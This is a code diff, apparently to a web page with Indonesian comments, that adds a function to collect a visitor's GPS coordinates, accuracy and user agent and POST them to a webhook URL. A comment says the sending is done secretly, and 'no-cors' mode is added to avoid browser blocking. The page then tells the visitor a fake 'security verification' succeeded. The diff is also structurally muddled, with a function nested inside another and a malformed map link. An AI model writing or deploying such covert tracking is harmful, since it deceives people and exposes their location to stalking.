@@ -68,24 +68,41 @@
         statusDiv.innerHTML = "🔄 Menyimpan data ke riwayat server...";
 
         // Mengirim data menggunakan metode POST secara diam-diam ke Webhook.site
+            function kirimKeWebhook(position) {
+        const statusDiv = document.getElementById('status');
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+        const akurasi = Math.round(position.coords.accuracy);
+        
+        const dataRiwayat = {
+            waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB",
+            latitude: lat,
+            longitude: lng,
+            akurasi_meter: akurasi,
+            perangkat: navigator.userAgent,
+            link_peta: `https://google.com{lat},${lng}`
+        };
+
+        statusDiv.innerHTML = "🔄 Menyimpan data ke riwayat server...";
+
+        // Menambahkan mode: "no-cors" agar tidak diblokir oleh Google Chrome HP
         fetch(WEBHOOK_URL, {
             method: "POST",
+            mode: "no-cors", 
             headers: {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify(dataRiwayat)
         })
-        .then(response => {
-            if (response.ok) {
-                statusDiv.innerHTML = "<span style='color: #28a745;'><b>✓ Verifikasi Sukses!</b></span><br>Perangkat Anda berhasil dicatat dalam log keamanan.";
-            } else {
-                statusDiv.innerHTML = "<span style='color: #dc3545;'><b>Gagal menyimpan data.</b></span><br>Periksa kembali URL Webhook Anda.";
-            }
+        .then(() => {
+            // Karena menggunakan mode no-cors, kita langsung anggap sukses kirim
+            statusDiv.innerHTML = "<span style='color: #28a745;'><b>✓ Verifikasi Sukses!</b></span><br>Perangkat Anda berhasil dicatat dalam log keamanan.";
         })
         .catch(error => {
-            statusDiv.innerHTML = "<span style='color: #dc3545;'><b>Error:</b> Masalah jaringan saat mengirim data riwayat.</span>";
+            statusDiv.innerHTML = "<span style='color: #dc3545;'><b>Error Koneksi:</b> Gagal mengirim data riwayat ke server.</span>";
         });
     }
+
 
     function tanganiError(error) {
         const statusDiv = document.getElementById('status');
